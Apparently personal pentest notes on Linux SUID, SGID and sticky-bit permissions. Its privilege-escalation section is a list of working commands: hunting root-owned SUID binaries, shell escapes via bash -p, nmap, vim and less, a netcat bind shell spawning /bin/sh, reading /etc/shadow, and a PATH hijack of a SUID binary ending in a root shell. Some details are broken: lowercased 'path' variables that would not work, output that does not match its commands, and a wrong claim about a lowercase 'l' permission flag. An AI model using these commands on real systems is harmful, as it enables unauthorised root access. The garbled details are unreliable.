# suid (set user id)

> when a command or script with suid bit set is run, its effective uid becomes that of the owner of the file, rather than of the user who is running it

    # set it
    chmod 4555 <file>
    ls -lrt <file>

    # find them
    find / -user root -perm -4000 -print 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} \;

## privilege escalation
    
    # to retain the setuid privs, you must supply the -p flag
    bash -p -i
    
    nmap --interactive
    !sh

    find pentestlab -exec whoami \;
    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;

    vim.tiny /etc/shadow
    ESC
    :set shell=/bin/sh
    :shell

    less /etc/passwd
    !/bin/sh

    # highjacking docker-security dependency
    $ ls -l /usr/local/bin/docker-security
    -rwsr-xr-x 1 root mortal 16720 feb 15 20:00 /usr/local/bin/docker-security
    $ echo "/bin/bash" > /tmp/chmod
    $ chmod 777 /tmp/chmod
    $ export path=/tmp:$path
    $ echo $path
    $ cd /usr/local/bin/
    /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
    $ ./docker-security
    # id
    uid=0(root) gid=0(root) groups=0(root)

[More binary commands shell invocations](./ishell.md#direct-shell)

# guid (set group id)

> sgid permission is similar to the suid permission, only difference is – when the script or command with sgid on is run, it runs as if it were a member of the same group in which the file is a member

    # set it
    chmod g+s <dir>
    chmod 2555 <file>

    # find them
    find / -perm -g=s -type f 2>/dev/null

– the setgid permission displays as an "s" in the group’s execute field
- if lowercase letter "l" appears in the group’s execute field, it indicates that the setgid bit is on, and the execute bit for the group is off or denied

# sticky bit

> shared directories such as /var/tmp and /tmp because users can create files, read and execute files owned by other users, but are not allowed to remove files owned by other users

    # set it
    chmod +t <dir>
    chmod 1777 <dir>

- T refers to when the execute permissions are off.
- t refers to when the execute permissions are on.
